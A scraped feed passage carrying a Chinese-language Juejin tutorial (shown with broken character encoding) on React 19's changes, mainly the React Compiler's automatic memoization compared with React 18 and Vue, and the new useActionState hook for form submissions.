src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/692b02ec164d46bd8eac686ba2206c4d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgT3BlblRpbnnnpL7ljLo=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769069063&amp;x-signature=b9RKfLDvqWVs8YCcd50VV4KsM%2F8%3D" alt="OpenTiny2025å¹´å¹´åº¦è´¡çŒ®è€….png" loading="lazy"/></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[ä¸€æ–‡ææ‡‚â€”â€”React 19åˆ°åº•æ›´æ–°äº†ä»€ä¹ˆ]]></title>    <link>https://juejin.cn/post/7595185093833900067</link>    <guid>https://juejin.cn/post/7595185093833900067</guid>    <pubDate>2026-01-15T08:12:24.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7595185093833900067" data-draft-id="7595289498445037594" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="ä¸€æ–‡ææ‡‚â€”â€”React 19åˆ°åº•æ›´æ–°äº†ä»€ä¹ˆ"/> <meta itemprop="keywords" content="å‰ç«¯,React.js,å‰ç«¯æ¡†æ¶"/> <meta itemprop="datePublished" content="2026-01-15T08:12:24.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="å¤©å¤©æ‰­ç "/> <meta itemprop="url" content="https://juejin.cn/user/3349589831715801"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            ä¸€æ–‡ææ‡‚â€”â€”React 19åˆ°åº•æ›´æ–°äº†ä»€ä¹ˆ
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3349589831715801/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    å¤©å¤©æ‰­ç 
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-15T08:12:24.000Z" title="Thu Jan 15 2026 08:12:24 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-15
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»15åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">å‰è¨€</h2>
<p>åœ¨2024å¹´12æœˆ5æ—¥ React19æ­£å¼ç‰ˆåœ¨npmä¸Šå‘å¸ƒ</p>
<h2 data-id="heading-1">ä¸€ã€æ€§èƒ½æå‡è¿›å…¥è‡ªåŠ¨åŒ–æ—¶ä»£â€”â€”æ ¸å¿ƒæ›´æ–°</h2>
<h3 data-id="heading-2">å‘Šåˆ«useMemoã€useCallbackã€React.memo</h3>
<p>åœ¨React18åŠä»¥å‰ï¼Œä¸ºäº†æ€§èƒ½ï¼Œä½ å¾—å°å¿ƒç¿¼ç¿¼åœ°ç»™å‡½æ•°å’Œè®¡ç®—ç»“æœåŒ…ä¸Š <code>useMemo</code> æˆ– <code>useCallback</code>ï¼Œè¿˜è¦ç›¯ç€é‚£ä¸ªçƒ¦äººçš„ä¾èµ–æ•°ç»„ï¼Œå†™é”™ä¸€ä¸ªå°±å‡º Bugã€‚</p>
<p>ä½†æ˜¯åœ¨React19æ¨å‡ºäº† <strong>React Compiler</strong>ã€‚å®ƒå°±åƒä¸€ä¸ªèªæ˜çš„åŠ©æ‰‹ï¼Œåœ¨åå°è‡ªåŠ¨å¸®ä½ åˆ†æå“ªäº›ç»„ä»¶éœ€è¦ç¼“å­˜ã€‚ä½ åªéœ€è¦å†™æ­£å¸¸çš„ JS ä»£ç ï¼Œæ€§èƒ½ä¼˜åŒ–äº¤ç»™ç¼–è¯‘å™¨ï¼Œä»£ç é‡ç¬é—´å°‘äº†ä¸€å¤§æˆªã€‚</p>
<p>ä¸‹é¢æˆ‘ä»¬å¯ä»¥çœ‹ä¸€ä¸ªä¾‹å­â€”â€”</p>
<p><strong>React18çš„å†™æ³•</strong></p>
<pre><code class="hljs language-jsx" lang="jsx"><span class="hljs-keyword">function</span> <span class="hljs-title function_">ProductList</span>(<span class="hljs-params">{ products, filterTerm }</span>) {
  <span class="hljs-comment">// 1. å¿…é¡»æ‰‹åŠ¨åŒ…è£¹ useMemoï¼Œå¦åˆ™æ¯æ¬¡æ¸²æŸ“éƒ½ä¼šé‡æ–°è®¡ç®—</span>
  <span class="hljs-comment">// 2. å¿…é¡»æ­»ç›¯ç€è¿™ä¸ª [products, filterTerm] ä¾èµ–æ•°ç»„ï¼Œæ¼å†™ä¸€ä¸ªå°±å‡º Bug</span>
  <span class="hljs-keyword">const</span> filteredProducts = <span class="hljs-title function_">useMemo</span>(<span class="hljs-function">() =&gt;</span> {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"æ­£åœ¨æ‰§è¡Œç¹é‡çš„è¿‡æ»¤é€»è¾‘..."</span>);
    <span class="hljs-keyword">return</span> products.<span class="hljs-title function_">filter</span>(<span class="hljs-function"><span class="hljs-params">p</span> =&gt;</span> p.<span class="hljs-property">name</span>.<span class="hljs-title function_">includes</span>(filterTerm));
  }, [products, filterTerm]); 

  <span class="hljs-comment">// 3. ä¼ ç»™å­ç»„ä»¶çš„å‡½æ•°ï¼Œå¿…é¡»åŒ…è£¹ useCallbackï¼Œå¦åˆ™å­ç»„ä»¶ä¼šè·Ÿç€çé‡ç»˜</span>
  <span class="hljs-keyword">const</span> handlePurchase = <span class="hljs-title function_">useCallback</span>(<span class="hljs-function">(<span class="hljs-params">id</span>) =&gt;</span> {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"è´­ä¹°å•†å“:"</span>, id);
  }, []);

  <span class="hljs-keyword">return</span> (
    <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">ul</span>&gt;</span>
      {filteredProducts.map(p =&gt; (
        <span class="hljs-tag">&lt;<span class="hljs-name">Item</span> <span class="hljs-attr">key</span>=<span class="hljs-string">{p.id}</span> <span class="hljs-attr">product</span>=<span class="hljs-string">{p}</span> <span class="hljs-attr">onPurchase</span>=<span class="hljs-string">{handlePurchase}</span> /&gt;</span>
      ))}
    <span class="hljs-tag">&lt;/<span class="hljs-name">ul</span>&gt;</span></span>
  );
}
</code></pre>
<p><strong>React19çš„å†™æ³•</strong></p>
<pre><code class="hljs language-jsx" lang="jsx"><span class="hljs-keyword">function</span> <span class="hljs-title function_">ProductList</span>(<span class="hljs-params">{ products, filterTerm }</span>) {
  <span class="hljs-comment">// æ²¡æœ‰ä»»ä½• Hookï¼Œå°±æ˜¯çº¯ JS é€»è¾‘</span>
  <span class="hljs-comment">// React Compiler ä¼šåœ¨ç¼–è¯‘æ—¶è‡ªåŠ¨åˆ†æï¼š</span>
  <span class="hljs-comment">// "åªè¦ products å’Œ filterTerm æ²¡å˜ï¼Œæˆ‘å°±ç›´æ¥ç»™ä¸Šæ¬¡çš„ç»“æœ"</span>
  <span class="hljs-keyword">const</span> filteredProducts = products.<span class="hljs-title function_">filter</span>(<span class="hljs-function"><span class="hljs-params">p</span> =&gt;</span> p.<span class="hljs-property">name</span>.<span class="hljs-title function_">includes</span>(filterTerm));

  <span class="hljs-comment">// è¿™é‡Œçš„å‡½æ•°ä¹Ÿä¸éœ€è¦ useCallback</span>
  <span class="hljs-comment">// ç¼–è¯‘å™¨ä¼šè‡ªåŠ¨å¸®ä½ åšâ€œå‡½æ•°æŒä¹…åŒ–â€ï¼Œç¡®ä¿å­ç»„ä»¶ä¸ä¼šå› ä¸ºå¼•ç”¨å˜åŒ–è€Œé‡ç»˜</span>
  <span class="hljs-keyword">const</span> <span class="hljs-title function_">handlePurchase</span> = (<span class="hljs-params">id</span>) =&gt; {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"è´­ä¹°å•†å“:"</span>, id);
  };

  <span class="hljs-keyword">return</span> (
    <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">ul</span>&gt;</span>
      {filteredProducts.map(p =&gt; (
        <span class="hljs-tag">&lt;<span class="hljs-name">Item</span> <span class="hljs-attr">key</span>=<span class="hljs-string">{p.id}</span> <span class="hljs-attr">product</span>=<span class="hljs-string">{p}</span> <span class="hljs-attr">onPurchase</span>=<span class="hljs-string">{handlePurchase}</span> /&gt;</span>
      ))}
    <span class="hljs-tag">&lt;/<span class="hljs-name">ul</span>&gt;</span></span>
  );
}
</code></pre>
<h3 data-id="heading-3">React Compilerçš„æ„ä¹‰</h3>
<p>React Compilerçš„æ„ä¹‰è¿œè¿œä¸æ­¢çœç•¥äº†useMemoã€useCallbackã€React.memo. è¿™æ˜¯react19æ›´æ–°çš„æ ¸å¿ƒç†å¿µçš„ä½“ç° <strong>â€œé€šè¿‡ç¼–è¯‘å™¨çš„åŠ›é‡ï¼ŒæŠ¹å¹³æ¡†æ¶ä¸åŸç”Ÿè¯­è¨€ä¹‹é—´çš„ç¼éš™ã€‚â€</strong></p>
<p>React 19 çš„ä¼Ÿå¤§ä¹‹å¤„ä¸åœ¨äºå®ƒå¢åŠ äº†å¤šå°‘æ–° APIï¼Œè€Œåœ¨äºå®ƒè®©â€˜React å¼€å‘è€…â€™é‡æ–°å˜å›äº†â€˜JavaScript å¼€å‘è€…â€™ã€‚å®ƒæ‰¿è®¤äº†äººç±»çš„å¤§è„‘ä¸è¯¥ç”¨æ¥è®°å¿†ä¾èµ–æ•°ç»„ï¼Œè€Œè¯¥ç”¨æ¥æ„å»ºä¸šåŠ¡é€»è¾‘ã€‚</p>
<h3 data-id="heading-4">å¯¹æ¯”Vue</h3>
<p>è°ˆåˆ°Reactï¼ŒVueæ€»æ˜¯ä¸å¯é¿å…çš„ä¸€ä¸ªè¯é¢˜ï¼ŒVueåœ¨ç¼“å­˜æ–¹é¢æ˜¯æ€ä¹ˆåšçš„å‘¢ï¼Ÿ</p>
<p><strong>Vue å†™æ³•</strong></p>
<pre><code class="hljs language-ini" lang="ini">const <span class="hljs-attr">count</span> = ref(<span class="hljs-number">0</span>)<span class="hljs-comment">;</span>

// ä½ å¿…é¡»æ˜ç¡®è°ƒç”¨ computed å‡½æ•°
// è™½ç„¶ä¸ç”¨å†™ä¾èµ–æ•°ç»„ï¼Œä½†å¿…é¡»é€šè¿‡ .value è¯»å€¼
const <span class="hljs-attr">doubled</span> = computed(() =&gt; count.value * <span class="hljs-number">2</span>)<span class="hljs-comment">;</span>
</code></pre>
<p><strong>React 18 å†™æ³•</strong></p>
<pre><code class="hljs language-ini" lang="ini">const <span class="hljs-section">[count, setCount]</span> = useState(0)<span class="hljs-comment">;</span>

// 1. å¿…é¡»æ‰‹åŠ¨å†™ useMemo
// 2. å¿…é¡»æ‰‹åŠ¨ç»´æŠ¤ä¾èµ–æ•°ç»„ <span class="hljs-section">[count]</span>
const <span class="hljs-attr">doubled</span> = useMemo(() =&gt; {
  return count * 2<span class="hljs-comment">;</span>
}, <span class="hljs-section">[count]</span>)<span class="hljs-comment">;</span>
</code></pre>
<p><strong>React 19 å†™æ³•</strong></p>
<pre><code class="hljs language-ini" lang="ini">const <span class="hljs-section">[count, setCount]</span> = useState(0)<span class="hljs-comment">;</span>

// æ²¡æœ‰ä»»ä½•æ¡†æ¶ APIï¼Œæ²¡æœ‰ä»»ä½•åŒ…è£¹å‡½æ•°
// å°±åƒå†™æ™®é€šçš„ JavaScript ä¸€æ ·
const <span class="hljs-attr">doubled</span> = count * <span class="hljs-number">2</span><span class="hljs-comment">;</span>
</code></pre>
<p>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°ï¼Œåœ¨React18ä¹‹å‰ï¼ŒVueçš„è‡ªåŠ¨ä¾èµ–è¿½è¸ªæ˜¯å¾ˆæœ‰ä¼˜åŠ¿çš„ï¼Œä½†æ˜¯åœ¨React19ï¼Œreactå®ç°äº†ä»è½ååˆ°åè¶…ï¼Œé‚£ä¹ˆVueä»€ä¹ˆæ—¶å€™ä¼šæŠ›å¼ƒæ‰è®¡ç®—å±æ€§ï¼Œä¹Ÿå®ç°è‡ªåŠ¨åŒ–ä¼˜åŒ–å‘¢ï¼Ÿ</p>
<p><strong>React 19 é€šè¿‡â€œé™ç»´æ‰“å‡»â€ï¼ŒæŠŠ Vue æ›¾ç»æœ€å¼•ä»¥ä¸ºå‚²çš„â€œè‡ªåŠ¨ä¾èµ–è¿½è¸ªâ€å˜å¾—æ›´é€æ˜ã€‚</strong></p>
<h2 data-id="heading-5">äºŒã€React19 çš„Actionsæœºåˆ¶â€”â€”å¼‚æ­¥çŠ¶æ€çš„â€œåŸç”ŸåŒ–â€</h2>
<h3 data-id="heading-6">useActionState</h3>
<h4 data-id="heading-7">react18çš„Actions</h4>
<p>åœ¨react18å‡è®¾æˆ‘ä»¬è¦å†™ä¸€ä¸ªç®€å•çš„è¯„è®ºæ¡†ï¼Œé€»è¾‘æ˜¯ï¼šç‚¹å‡»æäº¤ -&gt; æ˜¾ç¤ºåŠ è½½ä¸­ -&gt; æˆåŠŸåæ¸…ç©ºè¾“å…¥æ¡† -&gt; å¤±è´¥æ˜¾ç¤ºé”™è¯¯ã€‚é‚£ä¹ˆç»å…¸çš„å†™æ³•æ˜¯ä¸‹é¢è¿™ç§</p>
<pre><code class="hljs language-jsx" lang="jsx"><span class="hljs-keyword">function</span> <span class="hljs-title function_">CommentForm</span>(<span class="hljs-params"/>) {
  <span class="hljs-comment">// ç—›ç‚¹ 1ï¼šå¿…é¡»æ‰‹åŠ¨å®šä¹‰ä¸€å¤§å †çŠ¶æ€</span>
  <span class="hljs-keyword">const</span> [comment, setComment] = <span class="hljs-title function_">useState</span>(<span class="hljs-string">""</span>);
  <span class="hljs-keyword">const</span> [isPending, setIsPending] = <span class="hljs-title function_">useState</span>(<span class="hljs-literal">false</span>);
  <span class="hljs-keyword">const</span> [error, setError] = <span class="hljs-title function_">useState</span>(<span class="hljs-literal">null</span>);

  <span class="hljs-keyword">const</span> <span class="hljs-title function_">handleSubmit</span> = <span class="hljs-keyword">async</span> (<span class="hljs-params">e</span>) =&gt; {
    e.<span class="hljs-title function_">preventDefault</span>();
    
    <span class="hljs-comment">// ç—›ç‚¹ 2ï¼šæ‰‹åŠ¨å¼€å¯ Loading</span>
    <span class="hljs-title function_">setIsPending</span>(<span class="hljs-literal">true</span>);
    <span class="hljs-title function_">setError</span>(<span class="hljs-literal">null</span>);

    <span class="hljs-keyword">try</span> {
      <span class="hljs-keyword">await</span> <span class="hljs-title function_">saveComment</span>(comment); <span class="hljs-comment">// å¼‚æ­¥è¯·æ±‚</span>
      <span class="hljs-title function_">setComment</span>(<span class="hljs-string">""</span>); <span class="hljs-comment">// æˆåŠŸåæ‰‹åŠ¨é‡ç½®</span>
    } <span class="hljs-keyword">catch</span> (e) {
      <span class="hljs-comment">// ç—›ç‚¹ 3ï¼šæ‰‹åŠ¨æ•è·å¹¶å¤„ç†é”™è¯¯</span>
      <span class="hljs-title function_">setError</span>(e.<span class="hljs-property">message</span>);
    } <span class="hljs-keyword">finally</span> {
      <span class="hljs-comment">// ç—›ç‚¹ 4ï¼šæ‰‹åŠ¨å…³é—­ Loading</span>
      <span class="hljs-title function_">setIsPending</span>(<span class="hljs-literal">false</span>);
    }
  };

  <span class="hljs-keyword">return</span> (
    <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">onSubmit</span>=<span class="hljs-string">{handleSubmit}</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">textarea</span> 
        <span class="hljs-attr">value</span>=<span class="hljs-string">{comment}</span> 
        <span class="hljs-attr">onChange</span>=<span class="hljs-string">{(e)</span> =&gt;</span> setComment(e.target.value)} 
      /&gt;
      {/* ç—›ç‚¹ 5ï¼šLoading çŠ¶æ€åˆ†æ•£åœ¨å„å¤„ï¼Œå®¹æ˜“æ¼æ‰ç¦ç”¨é€»è¾‘ */}
      <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">disabled</span>=<span class="hljs-string">{isPending}</span>&gt;</span>
        {isPending ? "æäº¤ä¸­..." : "å‘å¸ƒè¯„è®º"}
      <span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>
      {error &amp;&amp; <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>{error}<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>}
    <span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span></span>
  );
}
</code></pre>
<p>å¯èƒ½æœ‰å°ä¼™ä¼´ä¸ç†è§£<strong>ä¸ºä»€ä¹ˆä¸€å®šè¦å®šä¹‰çŠ¶æ€isPendingå’Œerror</strong>ï¼Œæˆ‘ä»¬ç›´æ¥ä½¿ç”¨ä¸è¡Œä¹ˆï¼Ÿ</p>
<p>æˆ‘ä»¬è¦çŸ¥é“çš„æ˜¯<strong>reactçš„æ ¸å¿ƒæ€æƒ³æ˜¯UI=f(date)</strong>ï¼Œæ•°æ®ï¼ˆçŠ¶æ€ï¼‰æ˜¯é©±åŠ¨UIæ¸²æŸ“çš„æœ€ç»ˆå› ç´ ï¼Œåº•å±‚çš„DOMæ‰¹é‡æ›´æ–°ä¹Ÿæ˜¯é€šè¿‡åˆ¤æ–­çŠ¶æ€æ˜¯å¦å˜åŒ–æ¥ç¡®å®šçš„ã€‚å¦‚æœä¸è®¾ç½®isPendingå’Œerrorå°±å¯èƒ½å‡ºç°ä¸‹é¢çš„æƒ…å†µâ€”â€”</p>
<p>ä½ å‘èµ·ä¸€ä¸ªå¼‚æ­¥è¯·æ±‚ï¼Œå³ä½¿åå°æ­£åœ¨ç–¯ç‹‚ä¸‹è½½æ•°æ®ï¼ŒReact çš„æ¸²æŸ“å¼•æ“æ ¹æœ¬ä¸çŸ¥é“è¿™ä»¶äº‹ã€‚</p>
<p>ç”¨æˆ·ç‚¹å‡»äº†â€œæäº¤â€ï¼Œé¡µé¢å´æ²¡æœ‰ä»»ä½•ååº”ï¼ˆæŒ‰é’®æ²¡å˜ç°ã€æ²¡æœ‰è½¬åœˆåœˆï¼‰ã€‚ç”¨æˆ·ä»¥ä¸ºæ²¡ç‚¹ç€ï¼Œå°±ä¼šä¸åœåœ°ç‹‚ç‚¹ï¼Œå¯¼è‡´åå°æ”¶åˆ°ä¸€å †é‡å¤è¯·æ±‚ã€‚</p>
<p>æ‰€ä»¥å­˜å‚¨ isPending æ˜¯ä¸ºäº†å‘Šè¯‰ Reactï¼šæˆ‘ç°åœ¨çŠ¶æ€å˜äº†ï¼Œè¯·ä½ èµ¶ç´§é‡ç»˜ä¸€ä¸‹ UIã€‚</p>
<h5 data-id="heading-8">react18ä¸­æˆ‘ä»¬è®¾ç½®çš„çŠ¶æ€åˆ°åº•åœ¨åšä»€ä¹ˆ</h5>
<p>åœ¨ React 18 çš„è¿™ç§æ¨¡å¼ä¸‹ï¼Œå¼€å‘è€…å®é™…ä¸Šåœ¨å……å½“ <strong>â€œçŠ¶æ€åè°ƒå‘˜â€</strong>ï¼š</p>
<p>ç«æ€æ¡ä»¶ï¼šå¦‚æœç”¨æˆ·è¿ç‚¹ä¸¤æ¬¡æŒ‰é’®ï¼Œä½ éœ€è¦å†™é¢å¤–çš„é€»è¾‘é˜²æ­¢ç¬¬äºŒæ¬¡è¯·æ±‚è¦†ç›–ç¬¬ä¸€æ¬¡ã€‚</p>
<p>UI ä¸åŒæ­¥ï¼šå¦‚æœä½ å¿˜äº†åœ¨ finally é‡Œå…³é—­ isPendingï¼ŒæŒ‰é’®å°±æ°¸è¿œé”æ­»äº†ã€‚</p>
<p>æ ·æ¿ä»£ç å†—ä½™ï¼šæ¯ä¸€ä¸ªè¡¨å•ã€æ¯ä¸€ä¸ªæŒ‰é’®ç‚¹å‡»ï¼Œä½ éƒ½è¦é‡å¤å†™è¿™å¥— try-catch-finallyã€‚</p>
<p>åœ¨ React 18 ä¸­ï¼Œå¼‚æ­¥æ“ä½œåƒæ˜¯ä¸€å¤´éœ€è¦ä½ æ—¶åˆ»ç›¯ç€çš„çŒ›å…½ï¼Œä½ å¿…é¡»æ‰‹åŠ¨ç»™å®ƒå…³ç¬¼å­ï¼ˆsetLoadingï¼‰ã€å–‚é£Ÿï¼ˆhandleErrorï¼‰ã€‚è€Œåœ¨ React 19 ä¸­ï¼ŒReact ç»™å¼‚æ­¥æ“ä½œè£…ä¸Šäº†â€˜è‡ªåŠ¨é©¾é©¶ç³»ç»Ÿâ€™ã€‚ä½ åªéœ€è¦å‘Šè¯‰å®ƒç›®çš„åœ°ï¼ˆAction å‡½æ•°ï¼‰ï¼Œå®ƒä¼šè‡ªåŠ¨å¤„ç†èµ·æ­¥ã€å·¡èˆªå’Œåˆ¹è½¦ã€‚</p>
<h4 data-id="heading-9">react19çš„ä¼˜åŒ–</h4>
<p>åœ¨react19ä¸­çš„å†™æ³•æ˜¯è¿™æ ·çš„</p>
<pre><code class="hljs language-jsx" lang="jsx"><span class="hljs-keyword">function</span> <span class="hljs-title function_">CommentForm</span>(<span class="hljs-params"/>) {
  <span class="hljs-comment">// state åŒ…å«è¿”å›ç»“æœï¼ŒformAction æ˜¯è§¦å‘å‡½æ•°ï¼ŒisPending æ˜¯è‡ªåŠ¨è¿½è¸ªçš„çŠ¶æ€</span>
  <span class="hljs-keyword">const</span> [state, formAction, isPending] = <span class="hljs-title function_">useActionState</span>(
    <span class="hljs-keyword">async</span> (prevState, formData) =&gt; {
      <span class="hljs-keyword">const</span> content = formData.<span class="hljs-title function_">get</span>(<span class="hljs-string">"comment"</span>);
      <span class="hljs-keyword">const</span> result = <span class="hljs-keyword">await</span> <span class="hljs-title function_">saveComment</span>(content); 
      <span class="hljs-keyword">return</span> result; <span class="hljs-comment">// è¿”å›çš„ç»“æœä¼šè‡ªåŠ¨å­˜å…¥ state</span>
    },
    <span class="hljs-literal">null</span>
  );

  <span class="hljs-keyword">return</span> (
    <span class="hljs-comment">// æ³¨æ„ï¼šè¿™é‡Œä¸å†ç”¨ onSubmitï¼Œè€Œæ˜¯ç”¨ action</span>
    <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">{formAction}</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">textarea</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"comment"</span> /&gt;</span>
      
      {/* isPending ç”± React è‡ªåŠ¨ç®¡ç†ï¼ŒPromise æ²¡ç»“æŸå®ƒå°±æ˜¯ true */}
      <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">disabled</span>=<span class="hljs-string">{isPending}</span>&gt;</span>
        {isPending ? "æäº¤ä¸­..." : "å‘å¸ƒè¯„è®º"}
      <span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>
      
      {state?.error &amp;&amp; <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>{state.error}<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>}
    <span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span></span>
  );
}
</code></pre>
<p>æˆ‘ä»¬å¯ä»¥è§‚å¯Ÿåˆ°</p>
<ul>
<li>
<p>æ¶ˆå¤±äº†ï¼š <code>const [loading, setLoading] = useState(false)ã€‚</code></p>
</li>
<li>
<p>æ¶ˆå¤±äº†ï¼š <code>try { ... } finally { setLoading(false) }ã€‚</code></p>
</li>
<li>
<p>æ¶ˆå¤±äº†ï¼š <code>è¾“å…¥æ¡†çš„ value å’Œ onChangeï¼ˆåˆ©ç”¨ formData ç›´æ¥è¯»å–ï¼‰ã€‚</code></p>
</li>
<li>
